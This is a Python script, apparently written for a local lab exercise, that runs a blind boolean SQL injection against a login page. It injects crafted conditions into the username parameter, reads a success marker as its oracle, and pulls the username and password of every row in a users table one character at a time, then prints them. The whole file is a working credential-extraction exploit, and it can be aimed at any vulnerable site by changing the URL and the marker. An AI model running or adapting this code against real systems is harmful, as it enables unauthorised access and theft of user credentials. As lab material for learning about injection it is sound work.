import string
import urllib.parse
import urllib.request

BASE_URL = "http://localhost/lab09/login.php"
CHARSET = string.ascii_letters + string.digits
SUCCESS_MARKER = "Printing cat"


def is_success(username_payload, password="x"):
    query = urllib.parse.urlencode({
        "u": username_payload,
        "p": password
    })

    with urllib.request.urlopen(f"{BASE_URL}?{query}") as response:
        html = response.read().decode()

    return SUCCESS_MARKER in html


def find_length(row, field, max_length=200):
    for length in range(1, max_length):
        payload = (
            f'" OR (SELECT LENGTH({field}) '
            f'FROM users LIMIT 1 OFFSET {row})={length} -- '
        )

        if is_success(payload):
            return length

    return 0


def find_char(row, field, position):
    for char in CHARSET:
        payload = (
            f'" OR (SELECT ASCII(SUBSTRING({field},{position},1)) '
            f'FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
        )

        if is_success(payload):
            return char

    return ""


def extract_value(row, field):
    length = find_length(row, field)

    return "".join(
        find_char(row, field, pos)
        for pos in range(1, length + 1)
    )


results = []

for row in range(100):
    username = extract_value(row, "username")
    password = extract_value(row, "password")

    results.append((username, password))

    print(f"Row {row}: {username} / {password}")
